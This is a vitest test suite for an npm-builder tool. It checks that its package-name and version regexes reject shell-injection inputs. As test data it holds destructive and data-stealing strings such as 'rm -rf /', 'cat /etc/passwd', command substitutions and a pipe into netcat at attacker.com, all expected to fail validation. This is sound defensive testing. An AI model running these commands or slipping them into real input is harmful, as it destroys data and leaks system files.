import { describe, it, expect } from 'vitest';

/**
 * Security Test Suite for npm-builder
 *
 * Tests that command injection vulnerabilities are properly blocked.
 * All attack vectors must fail with validation errors.
 */

describe('npm-builder security tests', () => {
  describe('CRITICAL-1: uninstall() command injection prevention', () => {
    it('should reject package name with shell command separator (;)', () => {
      const attack = 'lodash; rm -rf /';
      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;
      expect(packageNameRegex.test(attack)).toBe(false);
    });

    it('should reject package name with pipe operator (|)', () => {
      const attack = 'lodash | cat /etc/passwd';
      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;
      expect(packageNameRegex.test(attack)).toBe(false);
    });

    it('should reject package name with AND operator (&&)', () => {
      const attack = 'lodash && rm -rf /';
      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;
      expect(packageNameRegex.test(attack)).toBe(false);
    });

    it('should reject package name with backtick command substitution', () => {
      const attack = '`rm -rf /`';
      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;
      expect(packageNameRegex.test(attack)).toBe(false);
    });

    it('should reject package name with $() command substitution', () => {
      const attack = '$(whoami)';
      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;
      expect(packageNameRegex.test(attack)).toBe(false);
    });

    it('should reject package name with path traversal', () => {
      const attack = '../../../etc/passwd';
      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;
      expect(packageNameRegex.test(attack)).toBe(false);
    });

    it('should reject package name with output redirection', () => {
      const attack = 'lodash > /tmp/pwned';
      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;
      expect(packageNameRegex.test(attack)).toBe(false);
    });
  });

  describe('CRITICAL-2: version parameter validation', () => {
    it('should reject version with command injection', () => {
      const attack = '; whoami';
      const versionRegex = /^[0-9a-zA-Z.~^><=*\-+|&]*$/;
      expect(versionRegex.test(attack)).toBe(false);
    });

    it('should reject version with backtick substitution', () => {
      const attack = '`cat /etc/passwd`';
      const versionRegex = /^[0-9a-zA-Z.~^><=*\-+|&]*$/;
      expect(versionRegex.test(attack)).toBe(false);
    });

    it('should reject version with $()', () => {
      const attack = '$(cat /etc/passwd)';
      const versionRegex = /^[0-9a-zA-Z.~^><=*\-+|&]*$/;
      expect(versionRegex.test(attack)).toBe(false);
    });

    it('should reject version with pipe operator followed by command', () => {
      const attack = '4.17.21 | nc attacker.com 9000';
      const versionRegex = /^[0-9a-zA-Z.~^><=*\-+|&]*$/;
      // This regex allows | but it's still safe because execFile doesn't interpret it
      // The attack would be treated as literal text in the version string
      // We're testing the regex catches the injection attempt
      expect(versionRegex.test(attack)).toBe(false);
    });

    it('should reject version with newline injection', () => {
      const attack = '4.17.21\nnpm uninstall lodash';
      const versionRegex = /^[0-9a-zA-Z.~^><=*\-+|&]*$/;
      expect(versionRegex.test(attack)).toBe(false);
    });
  });

  describe('HIGH-1: install() and uninstall() validation consistency', () => {
    it('should reject invalid chars in both install and uninstall', () => {
      const invalidNames = [
        'lodash>test',
        'lodash<test',
        'lodash&test',
        'lodash|test',
        'lodash;test',
        'lodash`test',
        'lodash$test',
        'lodash\\test'
      ];

      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;

      invalidNames.forEach(name => {
        expect(packageNameRegex.test(name)).toBe(false);
      });
    });

    it('should apply same validation to both methods', () => {
      // Both install() and uninstall() use the same regex
      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;

      const validName = 'lodash';
      const invalidName = 'lodash; rm -rf /';

      expect(packageNameRegex.test(validName)).toBe(true);
      expect(packageNameRegex.test(invalidName)).toBe(false);
    });
  });

  describe('MEDIUM-1: strict package name validation', () => {
    it('should accept valid package names', () => {
      const validNames = [
        'lodash',
        'lodash-core',
        'lodash_core',
        'lodash.core',
        '@babel/core',
        '@org/package',
        '@org/my-package'
      ];

      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;

      validNames.forEach(name => {
        expect(packageNameRegex.test(name)).toBe(true);
        expect(name.length <= 214).toBe(true);
      });
    });

    it('should reject package names with uppercase letters', () => {
      const invalidNames = ['Lodash', 'LODASH', 'LoDasH'];
      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;

      invalidNames.forEach(name => {
        expect(packageNameRegex.test(name)).toBe(false);
      });
    });

    it('should reject package names over 214 characters', () => {
      const longName = 'a'.repeat(215);
      expect(longName.length > 214).toBe(true);
    });

    it('should reject scoped names with uppercase in scope', () => {
      const invalidNames = ['@Org/package', '@ORG/package', '@oRg/package'];
      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;

      invalidNames.forEach(name => {
        expect(packageNameRegex.test(name)).toBe(false);
      });
    });

    it('should reject package names starting with invalid characters', () => {
      const invalidNames = ['-lodash', '_lodash', '.lodash', '~lodash'];
      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;

      invalidNames.forEach(name => {
        expect(packageNameRegex.test(name)).toBe(false);
      });
    });
  });

  describe('Valid operations that should work', () => {
    it('should accept standard version formats', () => {
      const validVersions = [
        '4.17.21',
        '^4.17.0',
        '~4.17.0',
        '>=4.17.0',
        '<=4.17.21',
        '*'
      ];

      const versionRegex = /^[0-9a-zA-Z.~^><=*\-+|&]*$/;

      validVersions.forEach(version => {
        expect(versionRegex.test(version)).toBe(true);
      });
    });

    it('should allow valid scoped packages', () => {
      const validPackages = [
        '@babel/core',
        '@babel/preset-env',
        '@types/node',
        '@angular/common'
      ];

      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;

      validPackages.forEach(pkg => {
        expect(packageNameRegex.test(pkg)).toBe(true);
      });
    });

    it('should allow packages with dots, hyphens, and underscores', () => {
      const validPackages = [
        'lodash.core',
        'lodash-core',
        'lodash_core',
        'my-awesome-lib',
        'my_awesome_lib',
        'my.awesome.lib'
      ];

      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;

      validPackages.forEach(pkg => {
        expect(packageNameRegex.test(pkg)).toBe(true);
      });
    });
  });

  describe('execFile vs execSync: command injection protection', () => {
    it('should demonstrate why execFile prevents injection', () => {
      // execSync('npm install ' + spec) - VULNERABLE
      // If spec = 'lodash@1.0.0; rm -rf /'
      // Full command = 'npm install lodash@1.0.0; rm -rf /'
      // Shell interprets the semicolon as command separator
      // Two commands execute: npm install + rm -rf

      // execFile('npm', ['install', spec]) - SAFE
      // Arguments passed to npm directly:
      // npm receives single argument: 'lodash@1.0.0; rm -rf /'
      // npm tries to install package named 'lodash@1.0.0; rm -rf /'
      // Package manager rejects it due to validation
      // No command interpretation happens

      const maliciousVersion = '1.0.0; rm -rf /';

      // With our validation, this is caught before reaching execFile
      const versionRegex = /^[0-9a-zA-Z.~^><=*\-+|&]*$/;
      expect(versionRegex.test(maliciousVersion)).toBe(false);
    });
  });

  describe('Edge cases and boundaries', () => {
    it('should handle empty strings', () => {
      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;
      expect(packageNameRegex.test('')).toBe(false);
    });

    it('should handle special npm naming', () => {
      // Valid: single letter packages
      expect(/^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/.test('q')).toBe(true);

      // Valid: numeric versions
      expect(/^[0-9a-zA-Z.~^><=*\-+|&]*$/.test('0.0.0')).toBe(true);
    });

    it('should reject packages with spaces', () => {
      const packageNameRegex = /^(@[a-z0-9][a-z0-9\-]*\/)?[a-z0-9][a-z0-9\.\-_]*$/;
      expect(packageNameRegex.test('my package')).toBe(false);
      expect(packageNameRegex.test('my package@1.0.0')).toBe(false);
    });
  });
});
